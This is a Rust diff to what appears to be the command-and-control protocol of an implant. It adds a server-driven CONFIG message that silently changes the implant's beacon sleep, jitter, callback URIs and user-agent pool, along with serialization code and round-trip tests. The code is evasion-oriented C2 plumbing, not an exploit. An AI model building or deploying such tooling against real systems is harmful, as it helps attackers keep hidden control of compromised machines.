@@ -11,6 +11,11 @@ pub mod msg {
     pub const SLEEP: u8 = 0x08;
     pub const ERROR: u8 = 0x09;
     pub const BATCH_END: u8 = 0x0A;
+    /// Server-driven configuration update (ABR-T037): rides the normal
+    /// frame channel inside the REGISTER response or a poll response
+    /// whose rule resolution changed. No task, no result — the implant
+    /// applies silently and the server audits `config_delivered`.
+    pub const CONFIG: u8 = 0x10;
 }
 
 pub mod task_kind {
@@ -279,6 +284,45 @@ pub enum Message {
     Sleep { secs: u64, jitter: f32 },
     Error { code: u8, message: String },
     BatchEnd,
+    Config(ConfigUpdate),
+}
+
+/// Server-driven configuration payload (ABR-T037). Every field carries a
+/// "keep" sentinel so a rule can override only what it names: sleep stays
+/// at `KEEP_SLEEP_SECS`, jitter at `KEEP_JITTER`, and empty lists keep the
+/// implant's current URIs / user-agent pool. `epoch` is the server's
+/// global rule-table revision, echoed back by nothing (the server tracks
+/// what each session applied) but useful in audits.
+#[derive(Debug, Clone, PartialEq)]
+pub struct ConfigUpdate {
+    pub epoch: u64,
+    pub sleep_secs: u64,
+    pub jitter: f32,
+    pub uris: Vec<String>,
+    pub user_agents: Vec<String>,
+}
+
+impl ConfigUpdate {
+    pub const KEEP_SLEEP_SECS: u64 = u64::MAX;
+    pub const KEEP_JITTER: f32 = -1.0;
+
+    /// An update that changes nothing — the "no rule matched" encoding.
+    pub fn noop(epoch: u64) -> Self {
+        ConfigUpdate {
+            epoch,
+            sleep_secs: Self::KEEP_SLEEP_SECS,
+            jitter: Self::KEEP_JITTER,
+            uris: Vec::new(),
+            user_agents: Vec::new(),
+        }
+    }
+
+    pub fn changes_something(&self) -> bool {
+        self.sleep_secs != Self::KEEP_SLEEP_SECS
+            || self.jitter != Self::KEEP_JITTER
+            || !self.uris.is_empty()
+            || !self.user_agents.is_empty()
+    }
 }
 
 fn put_str(buf: &mut Vec<u8>, value: &str) {
@@ -511,6 +555,20 @@ impl Message {
                 (msg::ERROR, buf)
             }
             Message::BatchEnd => (msg::BATCH_END, buf),
+            Message::Config(cfg) => {
+                put_u64(&mut buf, cfg.epoch);
+                put_u64(&mut buf, cfg.sleep_secs);
+                put_f32(&mut buf, cfg.jitter);
+                put_u16(&mut buf, cfg.uris.len() as u16);
+                for uri in &cfg.uris {
+                    put_str(&mut buf, uri);
+                }
+                put_u16(&mut buf, cfg.user_agents.len() as u16);
+                for ua in &cfg.user_agents {
+                    put_str(&mut buf, ua);
+                }
+                (msg::CONFIG, buf)
+            }
         }
     }
 
@@ -619,6 +677,28 @@ impl Message {
                 message: r.string()?,
             },
             msg::BATCH_END => Message::BatchEnd,
+            msg::CONFIG => {
+                let epoch = r.u64()?;
+                let sleep_secs = r.u64()?;
+                let jitter = f32::from_bits(r.u32()?);
+                let uri_count = r.u16()? as usize;
+                let mut uris = Vec::with_capacity(uri_count);
+                for _ in 0..uri_count {
+                    uris.push(r.string()?);
+                }
+                let ua_count = r.u16()? as usize;
+                let mut user_agents = Vec::with_capacity(ua_count);
+                for _ in 0..ua_count {
+                    user_agents.push(r.string()?);
+                }
+                Message::Config(ConfigUpdate {
+                    epoch,
+                    sleep_secs,
+                    jitter,
+                    uris,
+                    user_agents,
+                })
+            }
             _ => {
                 return Err(ProtocolError::Malformed(format!(
                     "unknown message type {msg_type:#04x}"
@@ -641,6 +721,14 @@ mod tests {
     #[test]
     fn messages_roundtrip() {
         roundtrip(Message::TaskPoll);
+        roundtrip(Message::Config(ConfigUpdate::noop(7)));
+        roundtrip(Message::Config(ConfigUpdate {
+            epoch: 42,
+            sleep_secs: 2,
+            jitter: 0.1,
+            uris: vec!["/a".into(), "/b".into()],
+            user_agents: vec!["ua-one".into()],
+        }));
         roundtrip(Message::Ping);
         roundtrip(Message::Pong);
         roundtrip(Message::BatchEnd);
